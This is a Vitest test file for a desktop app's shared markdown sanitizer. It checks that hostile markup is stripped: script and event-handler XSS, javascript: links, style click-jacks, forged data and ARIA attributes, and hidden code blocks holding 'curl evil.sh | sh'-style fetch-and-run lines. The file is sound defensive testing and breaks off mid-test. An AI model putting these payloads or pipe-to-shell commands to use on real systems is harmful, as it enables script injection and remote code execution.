// @vitest-environment jsdom
// The shared markdown path (P2-E16-01, §5.30 + §5.29).
//
// Two things are under test and they are different kinds of thing:
//
//  1. THE PIPELINE IS SINGULAR. §5.30 makes "one renderer, one sanitizer
//     configuration" a requirement rather than a preference, because two
//     pipelines drift and the security configuration drifts with them. A
//     comment cannot hold that; the last test in this file reads the source
//     tree and does.
//  2. THE SANITIZER ACTUALLY REFUSES. The viewer renders bytes we did not
//     write — a repository can contain hostile markdown, and an agent can be
//     talked into writing some. So the hostile input here is real markup with
//     real payloads, not a smoke test. It lives INSIDE this fixture: nothing in
//     this file touches a path outside the repo.
import { describe, it, expect, afterEach, beforeAll, beforeEach } from 'vitest';
import fs from 'fs';
import path from 'path';
import { act } from 'react';
import { createRoot, Root } from 'react-dom/client';
import { CSP_DEV, CSP_PROD } from '../../../shared/csp';
import { initI18nForTests } from '../i18n/test-i18n';
import { createRendererRegistry } from '../bootstrap';

import { renderFeedBlock } from '../extensibility/feed-render';
import { decorateDocument, DecorationLabels } from './document-render';
import { decorateFeedMarkdown } from './feed-markdown';
import type { FeedCodeLabels } from './feed-code';
import { classifyHref } from './document-link';
import { UpdateDialog } from '../components/UpdateDialog';
import {
  Markdown,
  MARKED_OPTIONS,
  renderMarkdown,
  SANITIZE_CONFIG,
  STREAMING_CARET,
} from './markdown';

describe('renderMarkdown — the one pipeline', () => {
  it('renders ordinary markdown', () => {
    const html = renderMarkdown('# Title\n\nSome **bold** text.');
    expect(html).toContain('<h1>Title</h1>');
    expect(html).toContain('<strong>bold</strong>');
  });

  it('renders GFM: tables, task lists, strikethrough, autolinks', () => {
    // What agents actually emit. `gfm` is marked's default, which is exactly
    // why it is pinned: a default is not a decision until something asserts it.
    const html = renderMarkdown(
      ['| a | b |', '| - | - |', '| 1 | 2 |', '', '- [ ] todo', '- [x] done', '', '~~gone~~'].join(
        '\n'
      )
    );
    expect(html).toContain('<table>');
    expect(html).toContain('<td>1</td>');
    expect(html).toContain('type="checkbox"');
    expect(html).toContain('<del>gone</del>');
  });

  it('does not turn a single newline into a <br> (breaks: false)', () => {
    // A hard-wrapped paragraph — every plan file in this repo is one — must not
    // render as a ladder of short lines.
    expect(renderMarkdown('one\ntwo')).not.toContain('<br');
    expect(MARKED_OPTIONS.breaks).toBe(false);
  });

  it('parses synchronously — useMemo cannot await', () => {
    expect(MARKED_OPTIONS.async).toBe(false);
    expect(typeof renderMarkdown('x')).toBe('string');
  });
});

describe('the sanitizer, on input we did not write (§5.29)', () => {
  // Each case is [what it is, the markdown, what must NOT survive]. Table-driven
  // so adding the next hostile shape is one line rather than a new test.
  const hostile: Array<[string, string, RegExp]> = [
    ['a raw script tag', 'before\n\n<script>globalThis.__pwned = 1;</script>\n\nafter', /<script/i],
    [
      'an onerror handler on an image',
      '<img src="x" onerror="globalThis.__pwned = 1">',
      /onerror/i,
    ],
    ['an onload handler on a body tag', '<body onload="globalThis.__pwned = 1">', /onload/i],
    ['a javascript: link', '[click me](javascript:globalThis.__pwned=1)', /javascript:/i],
    [
      'a javascript: link in raw HTML',
      '<a href="javascript:globalThis.__pwned=1">click me</a>',
      /javascript:/i,
    ],
    [
      'an inline SVG with a script payload',
      '<svg><script>globalThis.__pwned = 1;</script></svg>',
      /<svg|<script/i,
    ],
    [
      'an inline SVG with an onload handler',
      '<svg onload="globalThis.__pwned = 1"><circle r="9"/></svg>',
      /<svg|onload/i,
    ],
    ['an iframe', '<iframe src="https://example.invalid"></iframe>', /<iframe/i],
    ['an object tag', '<object data="x.swf"></object>', /<object/i],
    ['a base tag that would re-point every relative link', '<base href="https://example.invalid/">', /<base/i],
    ['an animated SVG attribute-setter', '<svg><set attributeName="href" to="javascript:1"/></svg>', /<svg|<set/i],
  ];

  for (const [what, markdown, forbidden] of hostile) {
    it(`strips ${what}`, () => {
      const html = renderMarkdown(markdown);
      expect(html).not.toMatch(forbidden);
    });
  }

  it('leaves the surrounding prose intact — it sanitizes, it does not blank', () => {
    // The failure mode worth naming: a sanitizer that answered '' for anything
    // suspicious would pass every test above and render nothing all day.
    const html = renderMarkdown('before\n\n<script>alert(1)</script>\n\nafter');
    expect(html).toContain('before');
    expect(html).toContain('after');
  });

  it('an inert payload is inert once it is in the DOM, not just in the string', () => {
    // The string assertions above are about text; this one mounts it. If the
    // sanitizer ever let a handler through, the flag is the proof.
    const host = document.createElement('div');
    document.body.appendChild(host);
    host.innerHTML = renderMarkdown('<img src="does-not-exist" onerror="globalThis.__pwned = 1">');
    const img = host.querySelector('img');
    img?.dispatchEvent(new Event('error'));
    expect((globalThis as Record<string, unknown>).__pwned).toBeUndefined();
    host.remove();
  });

  it('a <form> survives the sanitizer, and the CSP is what makes that safe', () => {
    // DOMPurify keeps forms — they are ordinary HTML and it strips the parts
    // that execute. Recorded here rather than papered over with a FORBID_TAGS
    // entry, because the layer that actually stops a markdown file from posting
    // your clipboard somewhere is `form-action 'none'` in the policy, and that
    // is the line worth pinning. If it ever leaves the CSP, this goes red.
    expect(renderMarkdown('<form action="https://example.invalid"><input></form>')).toContain(
      '<form'
    );
    expect(CSP_PROD).toContain("form-action 'none'");
    expect(CSP_DEV).toContain("form-action 'none'");
  });

  it('keeps ordinary links and images — the allow-list is not a deny-all', () => {
    const html = renderMarkdown('[docs](https://example.invalid/x) and ![pic](./local.png)');
    expect(html).toContain('href="https://example.invalid/x"');
    expect(html).toContain('src="./local.png"');
  });
});

declare global {
  var IS_REACT_ACT_ENVIRONMENT: boolean;
}

describe('<Markdown>', () => {
  let root: Root | undefined;
  let host: HTMLDivElement | undefined;

  beforeEach(() => {
    globalThis.IS_REACT_ACT_ENVIRONMENT = true;
  });

  const mount = (el: React.ReactElement): HTMLDivElement => {
    host = document.createElement('div');
    document.body.appendChild(host);
    root = createRoot(host);
    act(() => root!.render(el));
    return host;
  };

  afterEach(() => {
    act(() => root?.unmount());
    host?.remove();
    root = undefined;
    host = undefined;
  });

  it('renders through the shared pipeline, in the feed class by default', () => {
    const el = mount(<Markdown text="**hi**" />);
    const div = el.querySelector('.feed-md');
    expect(div?.innerHTML).toContain('<strong>hi</strong>');
  });

  it('takes another surface class without forking the pipeline', () => {
    const el = mount(<Markdown text="# h" className="doc-md" />);
    expect(el.querySelector('.doc-md')).not.toBeNull();
    expect(el.querySelector('.feed-md')).toBeNull();
  });

  it('while STREAMING it is plain text plus the caret — no markdown at all', () => {
    // P2-E18-10: half a document is not a document, and re-parsing per token is
    // quadratic in the length of the reply.
    const el = mount(<Markdown text="**not bold yet" streaming />);
    expect(el.querySelector('strong')).toBeNull();
    expect(el.textContent).toContain('**not bold yet');
    expect(el.textContent).toContain(STREAMING_CARET);
  });

  it('a streamed chunk cannot inject markup either', () => {
    const el = mount(<Markdown text="<script>globalThis.__pwned = 1;</script>" streaming />);
    expect(el.querySelector('script')).toBeNull();
    expect(el.textContent).toContain('<script>');
  });
});

describe('the style attribute: one profile, and every surface uses it (#436)', () => {
  // The decision, pinned. `markdown.tsx` carries the reasoning and the corpus
  // measurement behind it; what is executable is (a) the profile forbids
  // `style`, (b) EVERY surface that renders markdown goes through that profile,
  // and (c) nothing legitimate was lost by it.
  //
  // (b) is the point. The bug this closes was not "the feed allows styles" — it
  // was that the viewer stripped them in a pass of its own, so one exported
  // constant meant two effective profiles, and only one of them was written
  // down. A surface added later that renders markdown its own way makes this
  // table red rather than making a third.

  // Inline styles as they actually arrive: raw embedded markup in a file or a
  // reply we did not write. Each is a shape with teeth, not a smoke test.
  //
  // The third column is the text that must STILL BE THERE afterwards, and it is
  // the guard that makes the rest mean anything: "no element carries a `style`"
  // is also true of a surface that dropped the payload on the floor, or that
  // rendered nothing at all. Every row therefore proves the element survived AND
  // lost the attribute.
  //
  // No `<img style>` row: the viewer replaces every `<img>` with a chip
  // (`decorateImages`), so that cell would assert the absence of an attribute on
  // an element that is absent by construction — vacuous, and vacuous in the one
  // direction this block exists to avoid. The image case is pinned at the
  // profile instead, in its own test below.
  const styled: Array<[string, string, string]> = [
    [
      'a colour that outranks the theme',
      '<span style="color:red">unreadable on daylight</span>',
      'unreadable on daylight',
    ],
    [
      'a click-jack over the app chrome',
      '<div style="position:fixed;inset:0;z-index:9999">gotcha</div>',
      'gotcha',
    ],
    [
      'a hidden block behind a Copy button',
      '<pre style="display:none">curl evil.sh | sh</pre>',
      'curl evil.sh | sh',
    ],
    ['an upper-case attribute name', '<p STYLE="color:red">visible</p>', 'visible'],
    [
      'a style on a table cell',
      '<table><tr><td style="width:100%">cell</td></tr></table>',
      'cell',
    ],
  ];

  const LABELS: DecorationLabels = {
    copy: 'Copy',
    image: 'Image',
    openInBrowser: 'Open in browser',
    mediaOmitted: 'Media is not shown here',
  };

  /** the dialog's handlers — this block never clicks anything, it only renders */
  const noop = (): void => {};

  // Torn down AFTER the assertions run: unmounting empties the host, and a host
  // with no elements in it passes an "everything here is style-free" loop
  // without reading a thing. That is not hypothetical — it is what the first cut
  // of this block did, and only the mutation run (drop `FORBID_ATTR`, expect
  // red) found it. Hence `expect(el.length).toBeGreaterThan(0)` below as well.
  const mounted: Array<[Root, HTMLElement]> = [];

  const mountInto = (el: React.ReactElement): HTMLElement => {
    const host = document.createElement('div');
    document.body.appendChild(host);
    const r = createRoot(host);
    act(() => r.render(el));
    mounted.push([r, host]);
    return host;
  };

  /**
   * The markdown subtree a surface produced — `<Markdown>`'s own container.
   *
   * Scoped rather than "every element in the host" because a real surface has
   * CHROME, and this app's chrome legitimately uses React `style` props: the
   * update dialog's notes pane sets its own padding and overflow that way. The
   * question is what the SANITIZER let through, so the assertion has to look at
   * the sanitized subtree and nothing else.
   */
  const markdownIn = (host: HTMLElement): HTMLElement => {
    const el = host.querySelector<HTMLElement>('.feed-md');
    // `throw` rather than `expect(...).not.toBeNull()` + a cast: this narrows
    // for the type checker as well as failing the test, and "the surface
    // rendered no markdown at all" is the exact vacuity this block guards.
    if (!el) throw new Error('the surface rendered no markdown container at all');
    return el;
  };

  /** every surface, entered the way the app enters it */
  const surfaces: Array<[string, (markdown: string) => HTMLElement]> = [
    [
      'the feed',
      (markdown) =>
        // Through the real registry, exactly as FeedView does — not through
        // `<Markdown>` directly, or the test would pass while the feed grew a
        // renderer of its own.
        markdownIn(
          mountInto(
            <>
              {renderFeedBlock(createRendererRegistry(), {
                seq: 1,
                kind: 'assistant',
                sidechain: false,
                text: markdown,
              })}
            </>
          )
        ),
    ],
    [
      // The REAL dialog, not `<Markdown>` standing in for it. Release notes are
      // markdown from a GitHub release, and the drift worth catching is
      // "UpdateDialog stops rendering notes through the shared pipeline" — which
      // a row that renders `<Markdown>` itself could never notice, because it
      // would be testing its own stand-in. Mounting the component means
      // `UpdateDialog.tsx` losing its `<Markdown>` turns this red.
      'the update dialog',
      (markdown) =>
        markdownIn(
          mountInto(
            <UpdateDialog
              open
              status={{
                manual: false,
                prompt: true,
                result: {
                  ok: true,
                  state: 'available',
                  currentVersion: '0.1.0',
                  latestVersion: '0.2.0',
                  notes: markdown,
                  url: 'https://github.com/badsonstudios/switchboard.ai/releases/tag/v0.2.0',
                  checkedAt: '2026-08-05T10:00:00.000Z',
                },
              }}
              install={null}
              onClose={noop}
              onUpdate={noop}
              onOpenUrl={noop}
              onIgnore={noop}
              onSkip={noop}
              onCancelInstall={noop}
            />
          )
        ),
    ],
    [
      // Belt AND braces: `stripOurNamespace` removes `style` too, so this row
      // would stay green if the profile lost `FORBID_ATTR`. It is here for the
      // mapping — "the viewer renders through this pipeline" — not as the thing
      // that detects the drift. The two rows above are, and a mutation run
      // (2026-08-13, `FORBID_ATTR` dropped) put both of them red across every
      // payload.
      'the document viewer',
      (markdown) => {
        const { fragment } = decorateDocument(renderMarkdown(markdown), LABELS, (href) =>
          classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
        );
        const host = document.createElement('div');
        host.append(fragment);
        return host;
      },
    ],
  ];

  beforeAll(async () => {
    // Set HERE rather than inherited: the `<Markdown>` block below also sets it,
    // and describes run in file order, so this block only had it by accident of
    // where it sits. Reordering or deleting that block would have left `act()`
    // warning instead of acting.
    globalThis.IS_REACT_ACT_ENVIRONMENT = true;
    // The feed's registry renders real blocks, and real blocks translate.
    await initI18nForTests();
  });

  afterEach(() => {
    for (const [r, host] of mounted.splice(0)) {
      act(() => r.unmount());
      host.remove();
    }
  });

  it('the profile forbids it — one constant, not one pass per surface', () => {
    expect(SANITIZE_CONFIG.FORBID_ATTR).toContain('style');
    expect(renderMarkdown('<p style="color:red">x</p>')).not.toContain('style');
  });

  it('and the constant cannot be edited at runtime', () => {
    // "One configuration" has to survive the renderer as well as the source
    // tree: an exported mutable object is a second profile waiting to be
    // written. The array matters most — that is where the policy lives, and
    // freezing only the top level would leave it open.
    expect(Object.isFrozen(SANITIZE_CONFIG)).toBe(true);
    expect(Object.isFrozen(SANITIZE_CONFIG.FORBID_ATTR)).toBe(true);
    expect(Object.isFrozen(SANITIZE_CONFIG.USE_PROFILES)).toBe(true);
    // and it is genuinely inert, not merely flagged
    const forbidden = SANITIZE_CONFIG.FORBID_ATTR;
    expect(forbidden).toBeDefined();
    expect(() => forbidden?.pop()).toThrow();
    expect(SANITIZE_CONFIG.FORBID_ATTR).toContain('style');
  });

  for (const [surface, draw] of surfaces) {
    for (const [what, markdown, survives] of styled) {
      it(`${surface} strips ${what}`, () => {
        const md = draw(markdown);
        const els = [...md.querySelectorAll('*')];
        // Three assertions, and the first two are what stop the third being a
        // sentence about an empty room: the surface rendered elements, and the
        // payload is still IN them. Only then does "and none of them carries a
        // style" say anything. See the note on `styled`.
        expect(els.length).toBeGreaterThan(0);
        expect(md.textContent).toContain(survives);
        for (const el of els) expect(el.hasAttribute('style')).toBe(false);
      });
    }
  }

  it('an image cannot smuggle one either — pinned at the profile', () => {
    // Not a surface row: the viewer replaces every `<img>` with a chip, so this
    // only means anything where the sanitizer decides. See the note on `styled`.
    const html = renderMarkdown('<img src="x.png" style="width:100vw;height:100vh">');
    expect(html).toContain('src="x.png"');
    expect(html).not.toContain('style');
  });

  it('and the content itself survives — it strips the attribute, not the element', () => {
    const html = renderMarkdown('<span style="color:red">still here</span>');
    expect(html).toContain('<span>');
    expect(html).toContain('still here');
  });

  it('nothing markdown can emit is lost: GFM never writes an inline style', () => {
    // The measurement that made STRIP safe, as a test. Table alignment is the
    // one construct that looks like it needs `style` — `marked` renders it as
    // `align`, which DOMPurify keeps — and this app ships no syntax highlighter
    // writing colours inline. If a `marked` bump ever changes that, this goes
    // red on the alignment assertion before anyone notices missing formatting.
    const html = renderMarkdown(
      [
        '| left | centre | right |',
        '|:-----|:------:|------:|',
        '| 1 | 2 | 3 |',
        '',
        '- [x] done',
        '- [ ] todo',
        '',
        '~~gone~~ and [a link](https://example.invalid/x)',
        '',
        '```js',
        'const x = 1;',
        '```',
        '',
        '> quote',
        '',
        '![pic](./local.png)',
      ].join('\n')
    );
    expect(html).not.toContain('style=');
    expect(html).toContain('align="center"');
    expect(html).toContain('align="right"');
    expect(html).toContain('type="checkbox"');
    expect(html).toContain('<code');
    expect(html).toContain('<del>gone</del>');
    expect(html).toContain('src="./local.png"');
  });

  it('the <style> TAG was already out, and stays out', () => {
    // Wider than the attribute: a stylesheet is not scoped to the block that
    // carried it, so one from a document restyles the whole app. It falls to
    // `USE_PROFILES: { html: true }` rather than to `FORBID_ATTR`, which is
    // exactly the kind of thing that is true until a profile change makes it
    // quietly untrue.
    expect(renderMarkdown('<style>body{display:none}</style>')).not.toContain('<style');
    expect(renderMarkdown('<style>@import url(https://evil.test/x.css);</style>')).not.toContain(
      'evil.test'
    );
  });
});

describe('data attributes: no surface’s protocol is speakable (#465)', () => {
  // The layer that does not depend on remembering. Every decorating surface in
  // this app writes data attributes and then reads them back off the live DOM as
  // instructions — the viewer's `data-doc-*` (#410) and the feed's
  // `data-feed-*` / `data-no-toggle` (#465) — and the DOM does not remember who
  // wrote what. `ALLOW_DATA_ATTR: false` means the question never reaches a
  // surface: markdown emits no data attributes at all, so every one that would
  // arrive is raw embedded markup, which is the input §5.30 says to distrust.
  //
  // The per-surface take-back (`decoration-guard.ts`) still exists and still has
  // its own tests, because it covers `class` and callers that build HTML another
  // way. This block is the profile, and the profile alone.

  it('the profile refuses them — one constant, for surfaces that do not exist yet', () => {
    expect(SANITIZE_CONFIG.ALLOW_DATA_ATTR).toBe(false);
  });

  // Real protocol forgeries, each one an instruction to a handler that exists.
  const forged: Array<[string, string, string]> = [
    [
      'a phantom stop in the feed’s arrow-key list',
      '<button data-feed-expander aria-expanded="false">▾ OUT</button>',
      '▾ OUT',
    ],
    [
      'a block id that would capture a find jump',
      '<span data-feed-seq="4">not the block you searched for</span>',
      'not the block you searched for',
    ],
    ['a stand-down mark that deadens a tool box', '<div data-no-toggle>inert</div>', 'inert'],
    [
      'the viewer’s external-open instruction',
      '<a href="https://ok.test/x" data-doc-external="https://exfil.test/?leak">click</a>',
      'click',
    ],
    ['an attribute in a namespace nobody has claimed yet', '<p data-future="x">later</p>', 'later'],
  ];

  for (const [what, payload, survives] of forged) {
    it(`strips ${what}`, () => {
      const html = renderMarkdown(payload);
      expect(html).not.toContain('data-');
      // …and the message itself is untouched: this strips attributes, not text
      expect(html).toContain(survives);
    });
  }

  it('loses nothing markdown can emit — it never writes a data attribute', () => {
    // The whole GFM surface, for the same reason the `style` block renders it:
    // "nothing legitimate is lost" is a claim, and this is the only way to hold
    // it. `marked` writes `class="language-ts"` on a fence and `align` on a
    // table cell; it has no construct that produces `data-*`.
    const html = renderMarkdown(
      '# H\n\n| a | b |\n|:--|--:|\n| 1 | 2 |\n\n- [x] done\n- [ ] todo\n\n' +
        '```ts\nconst x = 1;\n```\n\n~~gone~~ and `code`\n\n![alt](./local.png)\n\n<https://auto.link/>\n'
    );
    expect(html).not.toContain('data-');
    expect(html).toContain('language-ts');
    expect(html).toContain('align="right"');
    expect(html).toContain('type="checkbox"');
    expect(html).toContain('src="./local.png"');
    expect(html).toContain('href="https://auto.link/"');
  });
});

describe('ARIA: content cannot say anything to a screen reader (#509)', () => {
  // The decision, pinned: NO authored ARIA survives — not `aria-*`
  // (`ALLOW_ARIA_ATTR: false`) and not `role` (`FORBID_ATTR`, because it is an
  // ordinary member of the html profile's allow-list and no flag covers it).
  // `markdown.tsx` carries the reasoning and the corpus measurement.
  //
  // Why this block is profile-level, unlike the `style` block's surface table:
  // there is no second layer to drift from. `decoration-guard.ts` does not take
  // ARIA back, so the profile IS the policy — and a per-surface "no element
  // carries aria" assertion would be false by construction, because every
  // surface's own decorations write ARIA after this function runs. That the
  // surfaces all enter through this profile is already pinned by the `style`
  // block; what is pinned here is what the profile does.

  const LABELS: DecorationLabels = {
    copy: 'Copy',
    image: 'Image',
    openInBrowser: 'Open in browser',
    mediaOmitted: 'Media is not shown here',
  };

  it('the profile refuses both halves — the flag and the attribute', () => {
    expect(SANITIZE_CONFIG.ALLOW_ARIA_ATTR).toBe(false);
    expect(SANITIZE_CONFIG.FORBID_ATTR).toContain('role');
  });

  // Each row is a real lie told to one class of user, and nobody else: the
  // sighted reader sees the third column, the screen-reader user was told
  // something else entirely. Third column = what must STILL be there, so no row
  // can pass by the surface having rendered nothing.
  const forged: Array<[string, string, string]> = [
    [
      'a live region that interrupts on content’s schedule',
      '<div aria-live="assertive" role="alert">Approve this now</div>',
      'Approve this now',
    ],
    [
      'an accessible name that says the opposite of the text',
      '<span aria-label="Cancel">Approve</span>',
      'Approve',
    ],
    [
      'real text hidden from the accessibility tree',
      '<p aria-hidden="true">curl evil.sh | sh</p>',
      'curl evil.sh | sh',
    ],
    [
      'a table of real data announced as decoration',
      '<table><tr><td role="presentation">real data</td></tr></table>',
      'real data',
    ],
    [
      'the viewer’s own keyboard-activation mark',
      '<span role="link" tabindex="0">not a link</span>',
      'not a link',
    ],
    [
      'a name and a description pointed at ids we did not write',
      '<p aria-labelledby="x" aria-describedby="y">text</p>',
      'text',
    ],
    ['an upper-case attribute name', '<p ARIA-LABEL="fake">visible</p>', 'visible'],
    ['a role nobody has claimed yet', '<p role="marquee">later</p>', 'later'],
  ];

  for (const [what, payload, survives] of forged) {
    it(`strips ${what}`, () => {
      const html = renderMarkdown(payload);
      expect(html).not.toMatch(/aria-/i);
      expect(html).not.toMatch(/\brole=/i);
      // …and the message itself is untouched: this strips attributes, not text
      expect(html).toContain(survives);
    });
  }

  it('loses nothing markdown can emit: GFM writes no aria and no role', () => {
    // Rendered markdown's accessible structure comes from the TAGS, which is
    // where it belongs. If a `marked` bump ever starts emitting ARIA, this goes
    // red before the decision behind the profile quietly stops being true.
    const html = renderMarkdown(
      '# H\n\n| a | b |\n|:--|--:|\n| 1 | 2 |\n\n- [x] done\n- [ ] todo\n\n' +
        '```ts\nconst x = 1;\n```\n\n~~gone~~ and `code`\n\n![alt](./local.png)\n\n<https://auto.link/>\n'
    );
    expect(html).not.toMatch(/aria-/i);
    expect(html).not.toMatch(/\brole=/i);
    expect(html).toContain('<table>');
    expect(html).toContain('<h1>H</h1>');
    expect(html).toContain('type="checkbox"');
    expect(html).toContain('language-ts');
  });

  it('the surface’s OWN ARIA still lands — this closes a channel, not the a11y', () => {
    // The half of the change that could break something real. `decorateLinks`
    // writes `role="link"` on a link whose `href` it removed, and
    // `DocumentViewer`'s keydown handler reads that role back to answer Enter;
    // `decorateTables` writes `role="group"` on the scroll container. Both run
    // AFTER the sanitizer, so both must survive — while the forged one in the
    // same document does not.
    const { fragment } = decorateDocument(
      renderMarkdown(
        '[docs](./other.md)\n\n<span role="link" tabindex="0">forged</span>\n\n| a |\n|---|\n| 1 |\n'
      ),
      LABELS,
      (href) => classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
    );
    const host = document.createElement('div');
    host.append(fragment);
    expect(host.querySelector('a')?.getAttribute('role')).toBe('link');
    expect(host.querySelector('.doc-table-wrap')?.getAttribute('role')).toBe('group');
    expect(host.querySelector('span')?.hasAttribute('role')).toBe(false);
    expect(host.textContent).toContain('forged');
  });
});

describe('legacy presentational attributes and focus order (#466, #598)', () => {
  // The decision, pinned: `color`, `bgcolor`, `face`, `size`, `hidden` and
  // `tabindex` all go, and `align` deliberately stays because GFM emits it.
  // `markdown.tsx` carries the reasoning and the corpus measurement.
  //
  // Profile-level, for #509's reason: there is no second layer to drift from.
  // `decoration-guard.ts` takes back `style` and each surface's own namespace,
  // not these, so the profile IS the policy — and a per-surface "no element
  // carries a tabindex" assertion would be false by construction, because
  // `decorateTables`, `decorateLinks` and the feed's Copy button all write one
  // after this function runs. That every surface enters through this profile is
  // already pinned by the `style` block's surface table; what is pinned here is
  // what the profile does, plus the two cases where a decoration pass gives a
  // stripped attribute its teeth back if it survives.

  const LABELS: DecorationLabels = {
    copy: 'Copy',
    image: 'Image',
    openInBrowser: 'Open in browser',
    mediaOmitted: 'Media is not shown here',
  };
  const FEED_LABELS: FeedCodeLabels = { copy: 'Copy', copied: 'Copied', copyCode: 'Copy code' };

  it('the profile forbids all six by name — no flag covers any of them', () => {
    for (const attr of ['color', 'bgcolor', 'face', 'size', 'hidden', 'tabindex']) {
      expect(SANITIZE_CONFIG.FORBID_ATTR).toContain(attr);
    }
  });

  it('and deliberately does NOT forbid `align`, which is markdown’s own', () => {
    // The one divergence from "strip the legacy presentational set", pinned
    // here rather than left to the comment: `marked` renders GFM column
    // alignment as `align`, so forbidding it would silently un-align every
    // table in the app. If someone adds it to the list, this reds and the row
    // below shows what it would have cost.
    expect(SANITIZE_CONFIG.FORBID_ATTR).not.toContain('align');
    const html = renderMarkdown('| l | c | r |\n|:--|:-:|--:|\n| 1 | 2 | 3 |\n');
    expect(html).toContain('align="right"');
    expect(html).toContain('align="center"');
  });

  // Third column = what must STILL be there, so no row can pass by the
  // sanitizer having eaten the element along with the attribute. The colours
  // are named rather than hex because this repo's lint bans a raw hex colour in
  // source — the attribute is what is under test, not its value.
  const forged: Array<[string, string, string, RegExp]> = [
    [
      'a font that picks its own colour, size and typeface',
      '<font color="crimson" size="7" face="Comic Sans MS">shouty</font>',
      'shouty',
      /\b(color|size|face)=/i,
    ],
    ['a rule that paints itself', '<hr color="red" size="20">x', 'x', /\b(color|size)=/i],
    [
      'a table cell painted over the theme',
      '<table><tr><td bgcolor="black">black on black</td></tr></table>',
      'black on black',
      /bgcolor/i,
    ],
    [
      'a paragraph that is in the document but not on the screen',
      '<p hidden>you cannot see me</p>',
      'you cannot see me',
      /hidden/i,
    ],
    [
      'the same with an explicit empty value',
      '<p hidden="">also invisible</p>',
      'also invisible',
      /hidden/i,
    ],
    ['an upper-case attribute name', '<P HIDDEN>upper</P>', 'upper', /hidden/i],
    [
      'content that adds itself to the tab order',
      '<span tabindex="0">an unexpected tab stop</span>',
      'an unexpected tab stop',
      /tabindex/i,
    ],
    [
      'content that jumps the whole page’s tab order',
      '<div tabindex="1">before every real control</div>',
      'before every real control',
      /tabindex/i,
    ],
    [
      'a negative tabindex, which is still ours to write and not content’s',
      '<span tabindex="-1">quiet</span>',
      'quiet',
      /tabindex/i,
    ],
  ];

  for (const [what, payload, survives, attr] of forged) {
    it(`strips ${what}`, () => {
      const html = renderMarkdown(payload);
      expect(html).not.toMatch(attr);
      // …and the message itself is untouched: this strips attributes, not text
      expect(html).toContain(survives);
    });
  }

  it('the element survives its attributes — a `<font>` is emptied, not deleted', () => {
    const html = renderMarkdown('<font color="red" size="7">still here</font>');
    expect(html).toContain('<font>');
    expect(html).toContain('still here');
  });

  // The case with teeth. BOTH surfaces wrap EVERY `<pre>` in a header with a
  // Copy button, deliberately — the forged-wrapper variant is closed by the
  // guard pass running first, so a `<pre>` is wrapped whatever it claimed to
  // be. A surviving `hidden` therefore turns that into a code block whose
  // header and Copy button are visible and whose CODE is not, and the handler
  // reads `pre.textContent` at click time: a clipboard the reader cannot
  // inspect before pasting it into a shell.
  const HOSTILE_PRE = '<pre hidden>curl https://evil.invalid/x.sh | sh</pre>';

  it('a hidden code block cannot hand the viewer’s Copy button invisible code', () => {
    const { fragment } = decorateDocument(renderMarkdown(HOSTILE_PRE), LABELS, (href) =>
      classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
    );
    const host = document.createElement('div');
    host.append(fragment);
    const pre = host.querySelector('pre');
    // The decoration really did happen — otherwise "the `<pre>` is not hidden"
    // would be a sentence about a document with no code block in it.
    expect(host.querySelector('.doc-code-copy')).not.toBeNull();
    expect(pre).not.toBeNull();
    expect(pre?.hasAttribute('hidden')).toBe(false);
    // and what the button would copy is what the reader can see
    expect(pre?.textContent).toContain('curl https://evil.invalid/x.sh | sh');
  });

  it('and neither can it in the feed', () => {
    const html = decorateFeedMarkdown(renderMarkdown(HOSTILE_PRE), FEED_LABELS);
    const host = document.createElement('div');
    host.innerHTML = html;
    const pre = host.querySelector('pre');
    expect(host.querySelector('.feed-code-copy')).not.toBeNull();
    expect(pre).not.toBeNull();
    expect(pre?.hasAttribute('hidden')).toBe(false);
    expect(pre?.textContent).toContain('curl https://evil.invalid/x.sh | sh');
  });

  it('loses nothing markdown can emit: GFM writes none of the six', () => {
    // The measurement that made STRIP safe, as a test — the same shape as the
    // `style` and ARIA blocks'. If a `marked` bump ever starts emitting one of
    // these, this reds before the decision behind the profile quietly stops
    // being true.
    const html = renderMarkdown(
      [
        '# H',
        '',
        '| left | centre | right |',
        '|:-----|:------:|------:|',
        '| 1 | 2 | 3 |',
        '',
        '- [x] done',
        '- [ ] todo',
        '',
        '~~gone~~ and [a link](https://example.invalid/x)',
        '',
        '```ts',
        'const x = 1;',
        '```',
        '',
        '> quote',
        '',
        '![pic](./local.png)',
        '',
        '<https://auto.link/>',
        '',
        '---',
      ].join('\n')
    );
    expect(html).not.toMatch(/\b(color|bgcolor|face|size|tabindex)=/i);
    expect(html).not.toMatch(/\shidden\b/i);
    // …and the formatting that makes it markdown is all still there
    expect(html).toContain('<h1>H</h1>');
    expect(html).toContain('<table>');
    expect(html).toContain('align="right"');
    expect(html).toContain('type="checkbox"');
    expect(html).toContain('language-ts');
    expect(html).toContain('<hr>');
  });

  it('the surfaces’ OWN tab stops still land — this closes a channel, not the keyboard', () => {
    // The half of the change that could break something real. Every `tabindex`
    // a surface needs is written AFTER the sanitizer: `decorateTables` gives
    // its scroll container one (a scroll box only a mouse can reach is
    // unreachable), `decorateLinks` puts one back on a link whose `href` it
    // removed, and the feed's Copy button takes itself OUT of the tab order
    // with `-1` because the conversation is one tab stop (#174). All three must
    // survive — while the forged one in the same document does not.
    const { fragment } = decorateDocument(
      renderMarkdown(
        '[docs](./other.md)\n\n<span tabindex="0">forged</span>\n\n| a |\n|---|\n| 1 |\n'
      ),
      LABELS,
      (href) => classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
    );
    const host = document.createElement('div');
    host.append(fragment);
    expect(host.querySelector('a')?.getAttribute('tabindex')).toBe('0');
    expect(host.querySelector('.doc-table-wrap')?.getAttribute('tabindex')).toBe('0');
    expect(host.querySelector('span')?.hasAttribute('tabindex')).toBe(false);
    expect(host.textContent).toContain('forged');

    const feed = document.createElement('div');
    feed.innerHTML = decorateFeedMarkdown(
      renderMarkdown('```ts\nconst x = 1;\n```\n\n<span tabindex="0">forged</span>\n'),
      FEED_LABELS
    );
    expect(feed.querySelector('.feed-code-copy')?.getAttribute('tabindex')).toBe('-1');
    expect(feed.querySelector('span')?.hasAttribute('tabindex')).toBe(false);
  });
});

describe('there is exactly one markdown pipeline', () => {
  it('no other production file imports marked or dompurify', () => {
    // §5.30 states the shared renderer as a REQUIREMENT: "The viewer uses the
    // same module and the same sanitizer configuration — stated as a
    // requirement because two pipelines would drift, and the security
    // configuration would drift with them." This test is that sentence,
    // enforced. Modelled on `shared/ipc/refusal.test.ts`'s brand-uniqueness
    // check, which reads source rather than trusting a comment.
